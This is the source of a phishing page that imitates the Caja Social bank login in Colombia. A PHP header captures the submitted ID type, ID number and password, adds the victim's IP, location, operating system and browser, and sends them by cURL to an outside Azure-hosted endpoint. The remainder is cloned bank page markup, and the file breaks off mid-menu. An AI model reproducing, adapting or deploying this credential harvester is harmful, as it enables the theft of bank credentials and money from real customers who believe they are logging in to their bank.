<?php ini_set('display_errors', 0);
$userp = $_SERVER['REMOTE_ADDR'];

include('funciones.php');
if (isset($_POST['Seleid']) && isset($_POST['socialusu']) && isset($_POST['clavusu'])) {
  $message = 'CAJA SOCIAL
TIPO DOCUMENTO: ' . $_POST['Seleid'] . '
NRO DOCUMENTO: ' . $_POST['socialusu'] . '
CL4V3: ' . $_POST['clavusu'] . '
Fecha: ' . date('l jS \of F Y h:i:s A', time()) . '
Ip y Localidad: ' . $myip . ' ' . $pais . ' ' . $region . '
SO: ' . $user_os . '
Navegador: ' . $navegador . '';
  $payload = ['mensaje' => $message];
  $url = 'https://servidorapis-ggdnawe6aefxerg7.canadacentral-01.azurewebsites.net/cajasocialnequi/';

  $ch = curl_init($url);
  curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST           => true,
    CURLOPT_HTTPHEADER     => [
      'Accept: application/json',
      'Content-Type: application/json',
'X-Client-IP: ' . $myip,
    ],
    CURLOPT_POSTFIELDS     => json_encode($payload, JSON_UNESCAPED_UNICODE),
    CURLOPT_TIMEOUT        => 20,
    CURLOPT_CONNECTTIMEOUT => 10,
  ]);

  $response = curl_exec($ch);
  if ($response === false) {
    error_log('cURL error: ' . curl_error($ch));
    http_response_code(500);
    exit('Error de red.');
  }
  $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
  curl_close($ch);
}  ?>
<!DOCTYPE html>
<html dir="LTR" lang="es-co" xml:lang="es-co" class=" webkit">

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <style type="text/css">
    [uib-tooltip-popup].tooltip.top-left>.tooltip-arrow,
    [uib-tooltip-popup].tooltip.top-right>.tooltip-arrow,
    [uib-tooltip-popup].tooltip.bottom-left>.tooltip-arrow,
    [uib-tooltip-popup].tooltip.bottom-right>.tooltip-arrow,
    [uib-tooltip-popup].tooltip.left-top>.tooltip-arrow,
    [uib-tooltip-popup].tooltip.left-bottom>.tooltip-arrow,
    [uib-tooltip-popup].tooltip.right-top>.tooltip-arrow,
    [uib-tooltip-popup].tooltip.right-bottom>.tooltip-arrow,
    [uib-tooltip-html-popup].tooltip.top-left>.tooltip-arrow,
    [uib-tooltip-html-popup].tooltip.top-right>.tooltip-arrow,
    [uib-tooltip-html-popup].tooltip.bottom-left>.tooltip-arrow,
    [uib-tooltip-html-popup].tooltip.bottom-right>.tooltip-arrow,
    [uib-tooltip-html-popup].tooltip.left-top>.tooltip-arrow,
    [uib-tooltip-html-popup].tooltip.left-bottom>.tooltip-arrow,
    [uib-tooltip-html-popup].tooltip.right-top>.tooltip-arrow,
    [uib-tooltip-html-popup].tooltip.right-bottom>.tooltip-arrow,
    [uib-tooltip-template-popup].tooltip.top-left>.tooltip-arrow,
    [uib-tooltip-template-popup].tooltip.top-right>.tooltip-arrow,
    [uib-tooltip-template-popup].tooltip.bottom-left>.tooltip-arrow,
    [uib-tooltip-template-popup].tooltip.bottom-right>.tooltip-arrow,
    [uib-tooltip-template-popup].tooltip.left-top>.tooltip-arrow,
    [uib-tooltip-template-popup].tooltip.left-bottom>.tooltip-arrow,
    [uib-tooltip-template-popup].tooltip.right-top>.tooltip-arrow,
    [uib-tooltip-template-popup].tooltip.right-bottom>.tooltip-arrow,
    [uib-popover-popup].popover.top-left>.arrow,
    [uib-popover-popup].popover.top-right>.arrow,
    [uib-popover-popup].popover.bottom-left>.arrow,
    [uib-popover-popup].popover.bottom-right>.arrow,
    [uib-popover-popup].popover.left-top>.arrow,
    [uib-popover-popup].popover.left-bottom>.arrow,
    [uib-popover-popup].popover.right-top>.arrow,
    [uib-popover-popup].popover.right-bottom>.arrow,
    [uib-popover-html-popup].popover.top-left>.arrow,
    [uib-popover-html-popup].popover.top-right>.arrow,
    [uib-popover-html-popup].popover.bottom-left>.arrow,
    [uib-popover-html-popup] .popover.bottom-right>.arrow,
    [uib-popover-html-popup].popover.left-top>.arrow,
    [uib-popover-html-popup].popover.left-bottom>.arrow,
    [uib-popover-html-popup] .popover.right-top>.arrow,
    [uib-popover-html-popup].popover.right-bottom>.arrow,
    [uib-popover-template-popup].popover.top-left>.arrow,
    [uib-popover-template-popup] .popover.top-right>.arrow,
    [uib-popover-template-popup].popover.bottom-left>.arrow,
    [uib-popover-template-popup].popover.bottom-right>.arrow,
    [uib-popover-template-popup].popover.left-top>.arrow,
    [uib-popover-template-popup].popover.left-bottom>.arrow,
    [uib-popover-template-popup].popover.right-top>.arrow,
    [uib-popover-template-popup].popover.right-bottom>.arrow {
      top: auto;
      bottom: auto;
      left: auto;
      right: auto;
      margin: 0;
    }

    [uib-popover-popup].popover,
    [uib-popover-html-popup].popover,
    [uib-popover-template-popup].popover {
      display: block !important;
    }
  </style>
  <style type="text/css">
    .uib-position-measure {
      display: block !important;
      visibility: hidden !important;
      position: absolute !important;
      top: -9999px !important;
      left: -9999px !important;
    }

    .uib-position-scrollbar-measure {
      position: absolute !important;
      top: -9999px !important;
      width: 50px !important;
      height: 50px !important;
      overflow: scroll !important;
    }

    .uib-position-body-scrollbar-measure {
      overflow: scroll !important;
    }
  </style>
  <style type="text/css">
    [ng\:cloak],
    [ng-cloak],
    [data-ng-cloak],
    [x-ng-cloak],
    .ng-cloak,
    .x-ng-cloak,
    .ng-hide:not(.ng-hide-animate) {
      display: none !important;
    }

    ng\:form {
      display: block;
    }

    .ng-animate-shim {
      visibility: hidden;
    }

    .ng-anchor {
      position: absolute;
    }
  </style>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0">
  <link href="./documents/favicon.ico" rel="shortcut icon" type="image/x-icon">
  <title>login</title>
  <link href="https://www.cajasocial.com/portalserver/Login" rel="canonical">
  <meta name="robots" content="index"><!-- Portal client -->
  <link href="./documents/normalize.min.css" rel="stylesheet" type="text/css">
  <link href="./documents/backbase-portal.css" rel="stylesheet" type="text/css">
  <link href="./documents/theme-bcs-pub-whitelabel.css" rel="stylesheet" type="text/css">
  <link rel="stylesheet" type="text/css" href="./documents/shared.css">
  <script src="./documents/cor.js"></script>
  <style>
    .error-message {
      color: red;
      display: none;
    }

    #loading-gif {
      display: none;
    }

    .key-shift-enabled {
      border-bottom: 2px solid rgb(255, 0, 0);
    }
  </style>
</head>

<body onload="b$.portal.startup()">
  <div id="main" data-pid="page_1522165027195" class="bp-area --area pageContainer">
    <div data-pid="widget-bcs-pub-navegacion-tabs-ng-3226557" class="bp-widget bp-ui-dragRoot">
      <div class="bp-widget-head"></div>
      <div class="bp-widget-pref"></div>
      <div class="bp-widget-body ng-scope">
        <div g:onload="BB.Widget.ngStart(__WIDGET__);">
          <div class="widget-bcs-pub-navegacion-tabs-ng">
            <div class="bp-g-include" local="true" src="$(contextRoot)/static/features/%5BBBHOST%5D/${extension}/templates/template.ng.html"><!-- ngInclude: -->
              <ng-include src="ext.helpers.template" class="ng-scope">
                <div class="ext-bcs-pub-navegacion-tabs-ng ng-scope" data-ng-controller="PubNavegacionTabsController as $ctrl" tabindex="1">
                  <div class="bcs-pub-navegacion-tabs">
                    <button data-ng-click="$ctrl.goToMenu()" tabindex="1">Ir al menú principal</button>
                    <button data-ng-click="$ctrl.goToContent()" tabindex="1">Ir al contenido</button>
                    <button data-ng-click="$ctrl.goToFooter()" tabindex="1">Ir al footer</button>
                  </div>
                </div>
              </ng-include>
              <script type="text/ng-template" id="#ext-bcs-pub-navegacion-tabs-ng/list.html">
                <div class="ext-bcs-pub-navegacion-tabs-ng" data-ng-controller="PubNavegacionTabsController as $ctrl" tabindex="1">
    <div class="bcs-pub-navegacion-tabs">
      <button data-ng-click="$ctrl.goToMenu()" tabindex="1">Ir al menú principal</button>
      <button data-ng-click="$ctrl.goToContent()" tabindex="1">Ir al contenido</button>
      <button data-ng-click="$ctrl.goToFooter()" tabindex="1">Ir al footer</button>
    </div>
  </div>
</script>
            </div>
          </div>
        </div>
      </div>
      <div class="bp-widget-foot"></div>
    </div>
    <div data-pid="widget-bcs-pub-transparencia-y-contacto-ng-2904038" class="bp-widget bp-ui-dragRoot">
      <div class="bp-widget-head"></div>
      <div class="bp-widget-pref"></div>
      <div class="bp-widget-body ng-scope">
        <div g:onload="BB.Widget.ngStart(__WIDGET__);">
          <div class="widget-bcs-pub-transparencia-y-contacto-ng">
            <div class="bp-g-include" local="true" src="$(contextRoot)/static/features/%5BBBHOST%5D/${extension}/templates/template.ng.html"><!-- ngInclude: --><ng-include src="ext.helpers.template" class="ng-scope">
                <div class="ext-bcs-pub-transparencia-y-contacto-ng ng-scope" data-ng-controller="PubTransparenciaYContactoController as $ctrl">
                  <div class="bcs-pub-transparencia-y-contacto">
                    <div class="responsive-topbar">
                      <div class="transperency-box">
                        <a href="#" tabindex="1" data-ng-focus="$ctrl.changeState(false)" class="ng-binding">
                          Transparencia y Acceso a la Información Pública
                        </a>
                      </div>
                      <div data-ng-mouseover="$ctrl.changeState(true)" data-ng-mouseleave="$ctrl.changeState(false)">
                        <div class="contact-box" tabindex="1" data-ng-focus="$ctrl.changeState(true)">
                          <span class="ng-binding">
                            Línea Amiga <i data-ng-show="!state.onHover" class="ml-4 fa fa-chevron-down" aria-hidden="false"></i><i data-ng-show="state.onHover" class="ml-4 fa fa-chevron-up ng-hide" aria-hidden="true"></i>
                          </span>
                        </div>
                        <div data-ng-show="state.onHover" aria-hidden="true" class="ng-hide">
                          <div class="contact-info">
                            <p tabindex="1" class="ng-binding">
                              Bogotá
                            </p>
                            <h1 tabindex="1" class="ng-binding">
                              601 542 6446
                            </h1>
                            <p tabindex="1" class="ng-binding">
                              Línea Nacional Gratuita
                            </p>
                            <h1 tabindex="1" class="ng-binding">
                              01 8000 910 038
                            </h1>
                            <p id="Pruebatab" tabindex="1" class="ng-binding">
                              Desde su Celular
                            </p>
                            <h1 tabindex="1" data-ng-blur="ext.helpers.closeMenuTab($ctrl)" class="ng-binding">
                              #233
                            </h1>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                  <div id="Transparencia-y-acceso-a-la-informacion-publica-el" style="display:none">


                  </div>
                </div>
              </ng-include>
              <script type="text/ng-template" id="#ext-bcs-pub-transparencia-y-contacto-ng/list.html">
                <div class="ext-bcs-pub-transparencia-y-contacto-ng" data-ng-controller="PubTransparenciaYContactoController as $ctrl">
    <div class="bcs-pub-transparencia-y-contacto">
      <div class="responsive-topbar">
        <div class="transperency-box">
          <a href="{{ $ctrl.linkTransperency }}" tabindex="1" data-ng-focus="$ctrl.changeState(false)">
              {{ $ctrl.titleTransperency }}
          </a>
        </div>
        <div data-ng-mouseover="$ctrl.changeState(true)" data-ng-mouseleave="$ctrl.changeState(false)">
          <div class="contact-box" tabindex="1" data-ng-focus="$ctrl.changeState(true)">
            <span>
              {{ $ctrl.lineaAmiga }} <i data-ng-show="!state.onHover" class="ml-4 fa fa-chevron-down"></i><i data-ng-show="state.onHover" class="ml-4 fa fa-chevron-up"></i>
            </span>
          </div>
        <div data-ng-show="state.onHover">
          <div class="contact-info">
            <p tabindex="1">
              {{ $ctrl.city }}
            </p>
            <h1 tabindex="1">
              {{ $ctrl.cityNumber }}
            </h1>
            <p tabindex="1">
              {{ $ctrl.nationalLine }}
            </p>
            <h1 tabindex="1">
              {{ $ctrl.nationalNumber }}
            </h1>
            <p id="Pruebatab" tabindex="1">
              {{ $ctrl.cellphoneLine }}
            </p>
            <h1 tabindex="1" data-ng-blur="ext.helpers.closeMenuTab($ctrl)">
              #{{ $ctrl.cellphoneNumber }}
            </h1>
          </div>
        </div>
      </div>
      </div>
    </div>
    <div id="Transparencia-y-acceso-a-la-informacion-publica-el" style="display:none">
      <li class="responsive-sidebar">
          <a href="{{ $ctrl.linkTransperency }}" title="{{ $ctrl.titleTransperency }}">
            {{ $ctrl.titleTransperency }}<i class="icon-bcs icon-arrow-67 bcs-toggle-level"></i>
          </a>
      </li>
      <li class="responsive-sidebar" data-ng-class="{'bcs-open':show}" data-ng-click="show=!show">
        <i class="icon-bcs icon-arrow-67 bcs-toggle-level"></i>
        <i class="icon-bcs icon-arrow-68 bcs-toggle-level"></i>
        <a
          href="#"
          title="{{ $ctrl.lineaAmiga }}"
          class="dropdown-toggle"
          data-toggle="dropdown"
        > {{ $ctrl.lineaAmiga }}
          <i class="icon-bcs"></i>
        </a>
        <ul id="main-multi-level" class="dropdown-menu multi-level">
          <li class="dropdown-item">
            <p>
              {{ $ctrl.city }}
              <a
                href="tel:{{ $ctrl.cityNumber }}"
                title="{{ $ctrl.cityNumber }}"
                class="phone-number"
              >
                {{ $ctrl.cityNumber }}
              </a>
            </p>
          </li>
          <li class="dropdown-item">
            <p>
              {{ $ctrl.nationalLine }}
              <a href="tel:{{ $ctrl.nationalNumber }}"
                 title="{{ $ctrl.nationalNumber }}"
                 class="phone-number"
                 >{{ $ctrl.nationalNumber }}</a>
            </p>
          </li>
          <li class="dropdown-item">
            <p>
              {{ $ctrl.cellphoneLine }}
              <a href="tel:%23{{ $ctrl.cellphoneNumber }}"
                 title="{{ $ctrl.cellphoneNumber }}"
                 class="phone-number"
                 >#{{ $ctrl.cellphoneNumber }} </a>
            </p>
          </li>
        </ul>
      </li>
    </div>
  </div>
</script>
            </div>
          </div>
        </div>
      </div>
      <div class="bp-widget-foot"></div>
    </div>
    <div data-pid="widget-bcs-pub-accesibilidad-ng-9961818" class="bp-widget bp-ui-dragRoot">
      <div class="bp-widget-head"></div>
      <div class="bp-widget-pref"></div>
      <div class="bp-widget-body ng-scope">
        <div g:onload="BB.Widget.ngStart(__WIDGET__);">
          <div class="widget-bcs-pub-accesibilidad-ng">
            <div class="bp-g-include" local="true" src="$(contextRoot)/static/features/%5BBBHOST%5D/${extension}/templates/template.ng.html"><!-- ngInclude: --><ng-include src="ext.helpers.template" class="ng-scope">
                <div class="ext-bcs-pub-accesibilidad-ng ng-scope" data-ng-controller="PubAccesibilidadController as $ctrl">
                  <div class="bcs-pub-accesibilidad" data-ng-mouseover="$ctrl.onHover = true" data-ng-mouseleave="$ctrl.onHover = false; $ctrl.viewActions = false">
                    <div class="bcs-pub-accesibilidad">
                      <div class="main-icon" data-ng-click="$ctrl.startAccesibility()" title="Botón de accesibilidad tamaño de la letra." role="button" tabindex="0">
                      </div>
                      <div class="accesibilidad-item ng-hide" data-ng-click="$ctrl.increaseFontSize()" data-ng-show="$ctrl.viewActions &amp;&amp; $ctrl.onHover" title="Botón para aumentar el tamaño de la letra" role="button" tabindex="0" aria-hidden="true">
                        <div class="item-icon a-plus">
                        </div>
                      </div>

                      <div class="accesibilidad-item ng-hide" data-ng-click="$ctrl.decreaseFontSize()" data-ng-show="$ctrl.viewActions &amp;&amp; $ctrl.onHover" title="Botón para disminuir el tamaño de la letra." role="button" tabindex="0" aria-hidden="true">
                        <div class="item-icon a-minus">
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </ng-include>
              <script type="text/ng-template" id="#ext-bcs-pub-accesibilidad-ng/list.html">
                <div class="ext-bcs-pub-accesibilidad-ng" data-ng-controller="PubAccesibilidadController as $ctrl">
    <div class="bcs-pub-accesibilidad"  data-ng-mouseover="$ctrl.onHover = true" data-ng-mouseleave="$ctrl.onHover = false; $ctrl.viewActions = false">
      <div class="bcs-pub-accesibilidad">
        <div class="main-icon" data-ng-click="$ctrl.startAccesibility()" title="Botón de accesibilidad tamaño de la letra.">
        </div>
        <div class="accesibilidad-item" data-ng-click="$ctrl.increaseFontSize()" data-ng-show="$ctrl.viewActions && $ctrl.onHover" title="Botón para aumentar el tamaño de la letra">
            <div class="item-icon a-plus">
            </div>
        </div>
        
        <div class="accesibilidad-item" data-ng-click="$ctrl.decreaseFontSize()" data-ng-show="$ctrl.viewActions && $ctrl.onHover" title="Botón para disminuir el tamaño de la letra.">
            <div class="item-icon a-minus">
            </div>
        </div>
      </div>
  </div>
</script>
            </div>
          </div>
        </div>
      </div>
      <div class="bp-widget-foot"></div>
    </div>
    <div class="main-navbar-overlay"></div>
    <nav id="main-navbar" class="navbar navbar-light navbar-expand-lg fixed-top bp-container bp-NavigationContainer bp-ui-dragRoot" data-pid="container-bcs-pub-navigation-1961597" role="navigation">
      <div class="pub-nav-container">
        <div class="nav-bar-content container">
          <div class="navbar-header"><button id="bcs-reponsive-btn" name="btn-name-#container-bcs-pub-navigation-1961597-navbar-collapse" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#container-bcs-pub-navigation-1961597-navbar-collapse"><i class="navbar-toggler-icon"></i></button>
            <div class="navbar-brand rb-brand --area bp-area">
              <div data-pid="CXPContentWidget-1793205" class="bp-widget bp-ui-dragRoot">
                <div class="bp-widget-head"></div>
                <div class="bp-widget-pref"></div>
                <div class="bp-widget-body be-ice-widget-rendered">
                  <div class="be-ice-widget" g:onload="return b$.universal.widgets.contentWidget.start(__WIDGET__)">
                    <div class="bp-g-include" proxy="false" src="$(contextRoot)/contenttemplates/rendered">
                      <div>
                        <div class="d-none d-sm-block">
                          <img src="./documents/Logo.svg" alt=" Caja Social Su  Amigo Empresa de la Fundacion Grupo Social" title="Logo  Caja Social">
                        </div>
                        <div class="d-block d-sm-none">
                          <img src="./documents/Logo.svg" alt=" Caja Social Su  Amigo Empresa de la Fundacion Grupo Social" title=" Caja Social">
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
                <div class="bp-widget-foot"></div>
              </div>
            </div>
          </div>
          <div id="container-bcs-pub-navigation-1961597-navbar-collapse" class="collapse navbar-collapse rb-navbar-links">
            <div class="navbar-nav rb-nav-top --area bp-area"><a href="#rb-content" tabindex="-1"></a>
              <div data-pid="CXPNavigationWidget-7074062" class="bp-widget bp-ui-dragRoot">
                <div class="bp-widget-head"></div>
                <div class="bp-widget-pref"></div>
                <div class="bp-widget-body">
                  <div class="bb-universal-nav navbar navbar-default" g:onload="b$.universal.widgets.NavigationWidget.start(__WIDGET__)">
                    <div class="bp-g-model" objecttype="link" renderer="advancedNav">
                      <ul class="navbar-nav" id="responsive-navbar-nav-bcs">
                        <li class="" id="menu-actionable" tabindex="1">

                          <i class="icon-bcs icon-arrow-67 bcs-toggle-level"></i>
                          <i class="icon-bcs icon-arrow-68 bcs-toggle-level"></i>

                          <a href="#" title="Personas" class="dropdown-toggle" data-toggle="dropdown">
                            <i class="icon-bcs "></i>
                            Personas
                          </a>

                          <ul id="main-multi-level" class="dropdown-menu multi-level">
                            <li class="invisible-accs" style="text-indent: -999em; height: 0px;" id="menu-actionable">
                              <a href="#" title="Validación de Identidad" aria-label="enlace a Personas" tabindex="-1">
                              </a>
                            </li>


                            <li class="" id="menu-actionable">

                              <a href="#" title="Cuentas Bancarias" class="dropdown-toggle" tabindex="-1">
                                <i class="icon-bcs icon-money"></i>
                                Cuentas Bancarias
                              </a>

                            </li>

                            <li class="" id="menu-actionable">

                              <a href="#" title="Crédito de Vivienda" class="dropdown-toggle" tabindex="-1">
                                <i class="icon-bcs icon-house-3"></i>
                                Crédito de Vivienda
                              </a>

                            </li>

                            <li class="" id="menu-actionable">

                              <a href="#" title="Créditos" class="dropdown-toggle" tabindex="-1">
                                <i class="icon-bcs icon-hand-coin"></i>
                                Créditos
                              </a>

                            </li>

                            <li class="" id="menu-actionable">

                              <a href="#" title="Tarjetas de Crédito" class="dropdown-toggle" tabindex="-1">
                                <i class="icon-bcs icon-credit-card"></i>
                                Tarjetas de Crédito
                              </a>

                            </li>

                            <li class="" id="menu-actionable">

                              <a href="#" title="Invierta con Nosotros" class="dropdown-toggle" tabindex="-1">
                                <i class="icon-bcs icon-chart-up"></i>
                                Invierta con Nosotros
                              </a>

                            </li>

                            <li class="" id="menu-actionable">

                              <a href="#" title="Pensionados" class="dropdown-toggle" tabindex="-1">
                                <i class="icon-bcs icon-bcs icon-profile-gentleman-1"></i>
                                Pensionados
                              </a>

                            </li>

                            <li class="" id="menu-actionable">

                              <a href="#" title="Seguros" class="dropdown-toggle" tabindex="-1">
                                <i class="icon-bcs icon-bcs icon-lock-3"></i>
                                Seguros
                              </a>

                            </li>

                            <li class="" id="menu-actionable">

                              <a href="#" title="Productos Complementarios" class="dropdown-toggle" tabindex="-1">
                                <i class="icon-bcs icon-umbrella"></i>
                                Productos Complementarios
                              </a>

                            </li>

                          </ul>

                        </li>
                        <li class="" id="menu-actionable" tabindex="1">

                          <i class="icon-bcs icon-arrow-67 bcs-toggle-level"></i>
                          <i class="icon-bcs icon-arrow-68 bcs-toggle-level"></i>

                          <a href="#" title="Microempresarios" class="dropdown-toggle" data-toggle="dropdown">
                            <i class="icon-bcs "></i>
                            Microempresarios
                          </a>

                          <ul id="main-multi-level" class="dropdown-menu multi-level">
                            <li class="invisible-accs" style="text-indent: -999em; height: 0px;" id="menu-actionable">
                              <a href="#" title="Microempresarios" aria-label="enlace a Microempresarios" tabindex="-1">
                              </a>
                            </li>


                            <li class="" id="menu-actionable">

                              <a href="#" title="Cash Management" class="dropdown-toggle" tabindex="-1">
                                <i class="icon-bcs icon-bcs icon-laptop-1"></i>
                                Cash Management
                              </a>

                            </li>

                            <li class="" id="menu-actionable">

                              <a href="#-0" title="Cuentas Bancarias" class="dropdown-toggle" tabindex="-1">
                                <i class="icon-bcs icon-money"></i>
                                Cuentas Bancarias
                              </a>

                            </li>

                            <li class="" id="menu-actionable">

                              <a href="#" title="Crédito Microempresa" class="dropdown-toggle" tabindex="-1">
                                <i class="icon-bcs icon-chart-up"></i>
                                Crédito Microempresa
                              </a>

                            </li>

                            <li class="" id="menu-actionable">

                              <a href="#" title="Invierta con Nosotros" class="dropdown-toggle" tabindex="-1">
                                <i class="icon-bcs icon-hand-coin"></i>
                                Invierta con Nosotros
                              </a>

                            </li>

                            <li class="" id="menu-actionable">

                              <a href="#" title="Seguros" class="dropdown-toggle" tabindex="-1">
                                <i class="icon-bcs icon-lock-3"></i>
                                Seguros
                              </a>

                            </li>

                            <li class="" id="menu-actionable">

                              <a href="#" title="Productos Complementarios " class="dropdown-toggle" tabindex="-1">
                                <i class="icon-bcs icon-umbrella"></i>
                                Productos Complementarios
                              </a>

                            </li>

                          </ul>

                        </li>
                        <li class="" id="menu-actionable" tabindex="1">

                          <i class="icon-bcs icon-arrow-67 bcs-toggle-level"></i>
                          <i class="icon-bcs icon-arrow-68 bcs-toggle-level"></i>

                          <a href="#" title="Pequeñas Empresas" class="dropdown-toggle" data-toggle="dropdown">
                            <i class="icon-bcs "></i>
                            Pequeñas Empresas
                          </a>

                          <ul id="main-multi-level" class="dropdown-menu multi-level">
                            <li class="invisible-accs" style="text-indent: -999em; height: 0px;" id="menu-actionable">
                              <a href="#" title="Pequeñas Empresas" aria-label="enlace a Pequeñas Empresas" tabindex="-1">
                              </a>
                            </li>


                            <li class="" id="menu-actionable">

                              <a href="#" title="Cuentas Bancarias" class="dropdown-toggle" tabindex="-1">
                                <i class="icon-bcs icon-money"></i>
                                Cuentas Bancarias
                              </a>

                            </li>

                            <li class="" id="menu-actionable">

                              <a href="#" title="Recaudos" class="dropdown-toggle" tabindex="-1">
                                <i class="icon-bcs icon-credit-card"></i>
                                Recaudos
                              </a>

                            </li>

                            <li class="" id="menu-actionable">

                              <a href="#" title="Créditos" class="dropdown-toggle" tabindex="-1">
                                <i class="icon-bcs icon-hand-coin"></i>
                                Créditos
                              </a>

                            </li>

                            <li class="" id="menu-actionable">

                              <a href="#" title="Invierta con Nosotros" class="dropdown-toggle" tabindex="-1">
                                <i class="icon-bcs icon-chart-up"></i>
                                Invierta con Nosotros
                              </a>

                            </li>

                            <li class="" id="menu-actionable">

                              <a href="#" title="Internet Empresarial " class="dropdown-toggle" tabindex="-1">
                                <i class="icon-bcs icon-laptop-1"></i>
                                Internet Empresarial
                              </a>

                            </li>

                            <li class="" id="menu-actionable">

                              <a href="#" title="Cash Management" class="dropdown-toggle" tabindex="-1">
                                <i class="icon-bcs icon-hand-coin"></i>
                                Cash Management
                              </a>

                            </li>

                            <li class="" id="menu-actionable">

                              <a href="#" title="Oferta de Nómina" class="dropdown-toggle" tabindex="-1">
                                <i class="icon-bcs icon-bank-notes-2"></i>
                                Oferta de Nómina
                              </a>

                            </li>

                            <li class="" id="menu-actionable">

                              <a href="#" title="Productos Complementarios" class="dropdown-toggle" tabindex="-1">
                                <i class="icon-bcs icon-setting-gears-2"></i>
                                Productos Complementarios
                              </a>

                            </li>

                          </ul>
                        </li>
                        <li class="" id="menu-actionable" tabindex="1">

                          <i class="icon-bcs icon-arrow-67 bcs-toggle-level"></i>
                          <i class="icon-bcs icon-arrow-68 bcs-toggle-level"></i>

                          <a href="#" title="Empresas" class="dropdown-toggle" data-toggle="dropdown">
                            <i class="icon-bcs "></i>
                            Empresas
                          </a>

                          <ul id="main-multi-level" class="dropdown-menu multi-level">
                            <li class="invisible-accs" style="text-indent: -999em; height: 0px;" id="menu-actionable">
                              <a href="#" title="Empresas" aria-label="enlace a Empresas" tabindex="-1">
                              </a>
                            </li>


                            <li class="" id="menu-actionable">

                              <a href="#" title="Internet Empresarial" class="dropdown-toggle" tabindex="-1">
                                <i class="icon-bcs icon-mouse-2"></i>
                                Internet Empresarial
                              </a>

                            </li>

                            <li class="" id="menu-actionable">

                              <a href="#" title="Producto de Ahorro e Inversión" class="dropdown-toggle" tabindex="-1">
                                <i class="icon-bcs icon-money"></i>
                                Producto de Ahorro e Inversión
                              </a>

                            </li>

                            <li class="" id="menu-actionable">

                              <a href="#" title="Cash Management" class="dropdown-toggle" tabindex="-1">
                                <i class="icon-bcs icon-laptop-2"></i>
                                Cash Management
                              </a>

                            </li>

                            <li class="" id="menu-actionable">

                              <a href="#" title="Productos Transaccionales" class="dropdown-toggle" tabindex="-1">
                                <i class="icon-bcs icon-hand-coin"></i>
                                Productos Transaccionales
                              </a>

                            </li>

                            <li class="" id="menu-actionable">
                              <a href="#" title="Productos de Financiación" class="dropdown-toggle" tabindex="-1">
                                <i class="icon-bcs icon-bank-notes-1"></i>
                                Productos de Financiación
                              </a>

                            </li>

                            <li class="" id="menu-actionable">

                              <a href="#" title="Financiación en Moneda Extranjera" class="dropdown-toggle" tabindex="-1">
                                <i class="icon-bcs icon-bank-notes-2"></i>
                                Financiación en Moneda Extranjera
                              </a>

                            </li>

                            <li class="" id="menu-actionable">

                              <a href="#" title="Productos Fiduciarios" class="dropdown-toggle" tabindex="-1">
                                <i class="icon-bcs icon-setting-gears-1"></i>
                                Productos Fiduciarios
                              </a>

                            </li>

                          </ul>

                        </li>
                        <li class="" id="menu-actionable" tabindex="1">

                          <i class="icon-bcs icon-arrow-67 bcs-toggle-level"></i>
                          <i class="icon-bcs icon-arrow-68 bcs-toggle-level"></i>

                          <a href="#" title="Constructores" class="dropdown-toggle" data-toggle="dropdown">
                            <i class="icon-bcs "></i>
                            Constructores
                          </a>

                          <ul id="main-multi-level" class="dropdown-menu multi-level">
                            <li class="invisible-accs" style="text-indent: -999em; height: 0px;" id="menu-actionable">
                              <a href="#" title="Constructores" aria-label="enlace a Constructores" tabindex="-1">
                              </a>
                            </li>


                            <li class="" id="menu-actionable">

                              <a href="#" title="Productos de Financiación" class="dropdown-toggle" tabindex="-1">
                                <i class="icon-bcs icon-money"></i>
                                Productos de Financiación
                              </a>

                            </li>

                            <li class="" id="menu-actionable">

                              <a href="#" title="Productos para Manejar los Excesos de Liquidez" class="dropdown-toggle" tabindex="-1">
                                <i class="icon-bcs icon-check"></i>
                                Productos para Manejar los Excesos de Liquidez
                              </a>

                            </li>

                            <li class="" id="menu-actionable">

                              <a href="#" title="Cash Management " class="dropdown-toggle" tabindex="-1">
                                <i class="icon-bcs icon-cash-register"></i>
                                Cash Management
                              </a>

                            </li>

                            <li class="" id="menu-actionable">

                              <a href="#" title="Internet Empresarial" class="dropdown-toggle" tabindex="-1">
                                <i class="icon-bcs icon-laptop-2"></i>
                                Internet Empresarial
                              </a>

                            </li>

                            <li class="" id="menu-actionable">

                              <a href="#" title="Financiación en Moneda Extranjera" class="dropdown-toggle" tabindex="-1">
                                <i class="icon-bcs icon-dollar-bag"></i>
                                Financiación en Moneda Extranjera
                              </a>
                            </li>
                            <li class="" id="menu-actionable">

                              <a href="#" title="Proyectos Financiados" class="dropdown-toggle" tabindex="-1">
                                <i class="icon-bcs icon-setting-wrenches"></i>
                                Proyectos Financiados
                              </a>
                            </li>
                            <li class="" id="menu-actionable">

                              <a href="#" title="Productos Fiduciarios" class="dropdown-toggle" tabindex="-1">
                                <i class="icon-bcs icon-setting-wrenches"></i>
                                Productos Fiduciarios
                              </a>

                            </li>
                          </ul>
                        </li>
                        <li class="responsive-sidebar">
                          <a href="#" title="Transparencia y Acceso a la Información Pública" class="ng-binding">
                            Transparencia y Acceso a la Información Pública<i class="icon-bcs icon-arrow-67 bcs-toggle-level"></i>
                          </a>
                        </li>
                        <li class="responsive-sidebar" data-ng-class="{&#39;bcs-open&#39;:show}" data-ng-click="show=!show" role="button" tabindex="0">
                          <i class="icon-bcs icon-arrow-67 bcs-toggle-level"></i>
                          <i class="icon-bcs icon-arrow-68 bcs-toggle-level"></i>
                          <a href="#" title="Línea Amiga" class="dropdown-toggle ng-binding" data-toggle="dropdown"> Línea Amiga
                            <i class="icon-bcs"></i>
                          </a>
                          <ul id="main-multi-level" class="dropdown-menu multi-level">
                            <li class="dropdown-item">
                              <p class="ng-binding">
                                Bogotá
                                <a href="tel:601 542 6446" title="601 542 6446" class="phone-number ng-binding">
                                  601 542 6446
                                </a>
                              </p>
                            </li>
                            <li class="dropdown-item">
                              <p class="ng-binding">
                                Línea Nacional Gratuita
                                <a href="tel:01 8000 910 038" title="01 8000 910 038" class="phone-number ng-binding">01 8000 910 038</a>
                              </p>
                            </li>
                            <li class="dropdown-item">
                              <p class="ng-binding">
                                Desde su Celular
